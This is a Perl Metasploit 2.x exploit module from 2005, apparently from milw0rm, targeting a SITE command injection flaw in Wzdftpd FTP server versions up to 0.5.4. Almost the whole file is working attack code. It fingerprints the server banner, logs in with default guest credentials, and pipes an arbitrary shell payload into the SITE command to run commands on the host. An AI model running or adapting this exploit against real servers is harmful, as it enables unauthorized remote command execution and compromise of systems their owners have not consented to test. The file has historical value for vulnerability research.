# Reference: http://www.milw0rm.com/id.php?id=1231 (kcope) /str0ke

# 
# Metasploit plugin for: Wzdftpd SITE Command Arbitrary Command Execution
# 2005 11 26 - David Maciejak
#

package Msf::Exploit::wzdftpd_site;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info = {
	'Name'     => 'Wzdftpd SITE Command Arbitrary Command Execution',
	'Version'  => '$Revision: 1.0 $',
	'Authors'  => [ 'David Maciejak <david dot maciejak at kyxar dot fr>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 1,
	'UserOpts' =>
	  {
		'RHOST'  => [1, 'ADDR', 'The target address'],
		'RPORT'  => [1, 'PORT', 'The target port', 21],
		'USER'   => [1, 'DATA', 'Username', 'guest'],
		'PASS'   => [1, 'DATA', 'Password', '%'],
		'SITECMD'=> [1, 'DATA', 'Custom site command'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		This module exploits an arbitrary command execution vulnerability in Wzdftpd
		threw SITE command. Wzdftpd version to 0.5.4 are vulnerable.
}),
	'Refs' =>
	  [
		['BID', '14935'],
	  ],

	'Payload' =>
	  {
		'Space' => 128,
		'Keys'  => ['cmd','cmd_bash'],
	  },

	'Keys' => ['wzdftpd_site'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host, 
		'PeerPort'  => $target_port, 
	);
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}
	my $res = $s->Recv(-1, 5);
	$s->Close();
    
	if (! $res) {
            $self->PrintLine("[*] No FTP banner");
            return $self->CheckCode('Unknown');
	}

	if ($res =~ /220 wzd server ready/) 
	{
		$self->PrintLine("[*] FTP Server is a wzdftpd server");
		return $self->CheckCode('Appears');
	}
	else
	{
		$self->PrintLine("[*] FTP Server is probably not vulnerable");
		return $self->CheckCode('Safe');
	}
}

sub Exploit {
	my $self = shift;
	my $target_host    = $self->GetVar('RHOST');
	my $target_port    = $self->GetVar('RPORT');
	my $custom_site_cmd=$self->GetVar('SITECMD');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $cmd            = $encodedPayload->RawPayload;
	my $user	   = $self->GetVar('USER');
	my $pass	   = $self->GetVar('PASS');
	
	my $s = Msf::Socket::Tcp->new(
		'PeerAddr' => $target_host,
		'PeerPort' => $target_port,
	  );

	if ($s->IsError){
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$self->PrintLine("[*] Establishing a connection to the FTP server ...");

	$s->Send("USER ".$user);

	my $result = $s->Recv(-1, 20);
	if (!($result=~/\d{3} User .+ okay, need password/))
	{
		$self->PrintLine("[*] Invalid user");
		return;
	}

	$s->Send("PASS ".$pass);
	$result = $s->Recv(-1, 20);

	if (!($result=~/\d{3} User logged in/))
	{
		$self->PrintLine("[*] Invalid password");
		return;
	}
	
	$s->Send("SITE ".$custom_site_cmd." | $cmd;");
	$result = $s->Recv(-1, 20);
	if (!($result=~/^200/))
	{
		$self->PrintLine("[*] Error: $result");
		return;
	}

	$self->PrintLine('');
	my @results = split ( /\n/, $result );
	chomp @results;
	for (my $i = 1; $i < @results -1; $i++){
			$self->PrintLine("$results[$i]");
	}
	return;
}

1;

# milw0rm.com [2005-11-04]
